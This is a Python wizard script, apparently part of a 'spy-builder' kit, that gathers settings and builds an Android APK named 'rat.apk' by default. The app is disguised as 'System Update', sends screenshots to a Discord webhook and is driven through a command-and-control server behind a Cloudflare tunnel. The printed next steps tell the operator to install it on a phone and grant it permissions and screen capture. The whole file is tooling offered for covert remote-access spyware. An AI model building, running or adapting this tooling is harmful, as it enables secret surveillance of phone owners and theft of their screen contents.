#!/usr/bin/env python3
"""
start.py — one-shot wizard. asks a few questions, builds the APK, done.
"""

import argparse
import getpass
import os
import secrets
import shutil
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent


def ask(prompt, default=None, secret=False):
    suffix = f" [{default}]" if default else ""
    while True:
        try:
            v = (getpass.getpass(prompt + suffix + ": ")
                 if secret else input(prompt + suffix + ": ")).strip()
        except EOFError:
            print("\n[!] aborted"); sys.exit(1)
        if not v and default:
            return default
        if v:
            return v
        print("[!] required")


def ask_int(prompt, default):
    while True:
        v = ask(prompt, str(default))
        try:
            return int(v)
        except ValueError:
            print("[!] not a number")


def validate_https(url: str) -> str:
    if not url.startswith(("http://", "https://")):
        print("[!] URL must start with http:// or https://")
        sys.exit(1)
    return url.rstrip("/")


def ensure_tool(name: str):
    if shutil.which(name) is None:
        print(f"[!] missing required tool: {name}")
        sys.exit(1)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--non-interactive", action="store_true")
    ap.add_argument("--url"); ap.add_argument("--token")
    ap.add_argument("--webhook"); ap.add_argument("--name")
    ap.add_argument("--port", type=int); ap.add_argument("--out")
    args = ap.parse_args()

    banner = """
╔══════════════════════════════════════════════════════════════╗
║  spy-builder — cloudflared-edition                           ║
║  builds an APK that talks to your cloudflare tunnel           ║
╚══════════════════════════════════════════════════════════════╝
"""
    print(banner)

    if not os.environ.get("ANDROID_SDK_ROOT") and not os.environ.get("ANDROID_HOME"):
        print("[!] ANDROID_SDK_ROOT / ANDROID_HOME not set. run setup.sh first.")
        sys.exit(1)
    ensure_tool("keytool")
    if not (HERE / "sources").exists():
        print(f"[!] missing {HERE/'sources'}"); sys.exit(1)

    # --- gather ---
    if args.non_interactive:
        url     = validate_https(args.url)
        token   = args.token
        webhook = args.webhook
        name    = args.name or "System Update"
        port    = args.port or 8080
        out     = args.out or "rat.apk"
    else:
        print("Answer a few questions. Blank = use default.\n")

        print("1) cloudflare tunnel URL (the https://xxx.trycloudflare.com host)")
        print("   start it with:  cloudflared tunnel --url http://localhost:8080")
        url = validate_https(ask("   tunnel url"))

        gen = secrets.token_urlsafe(24)
        print(f"\n2) shared auth token (protects your public URL)")
        token = ask("   token", default=gen)

        print(f"\n3) discord webhook URL (screenshots are posted here)")
        webhook = ask("   webhook")

        print(f"\n4) app display name")
        name = ask("   name", default="System Update")

        print(f"\n5) local port for c2_server.py (cloudflared forwards to it)")
        port = ask_int("   port", 8080)

        print(f"\n6) output APK path")
        out = ask("   out", default="rat.apk")

    print("\n" + "─"*60)
    print("review:")
    print(f"  tunnel url     : {url}")
    print(f"  auth token     : {token[:6]}… ({len(token)} chars)")
    print(f"  discord webhook: {webhook[:50]}…")
    print(f"  app name       : {name}")
    print(f"  c2_server port : {port}")
    print(f"  output         : {out}")
    print("─"*60)

    confirm = "y" if args.non_interactive else ask("build now? (y/n)", default="y")
    if confirm.lower() != "y":
        print("[*] aborted"); sys.exit(0)

    # --- invoke builder ---
    cmd = [
        sys.executable, str(HERE / "build.py"),
        "--url", url, "--token", token,
        "--webhook", webhook, "--name", name,
        "--out", out,
    ]
    print(f"\n[*] {' '.join(cmd)}\n")
    r = subprocess.run(cmd)
    if r.returncode != 0:
        print(f"\n[!] builder failed (rc={r.returncode})"); sys.exit(1)

    print("\n" + "─"*60)
    print(f"[+] APK written: {Path(out).resolve()}")
    print("\nnext steps:")
    print(f"  1. start the operator server:")
    print(f"        python3 c2_server.py --port {port} --token '{token}'")
    print(f"  2. start the tunnel (separate terminal):")
    print(f"        cloudflared tunnel --url http://localhost:{port}")
    print(f"     ^ must match the URL you configured in the APK.")
    print(f"  3. install the APK on the phone:")
    print(f"        adb install -r {out}")
    print(f"     or transfer and tap it. open once, tap Continue,")
    print(f"     grant permissions, accept screen-capture dialog.")
    print("─"*60)


if __name__ == "__main__":
    main()
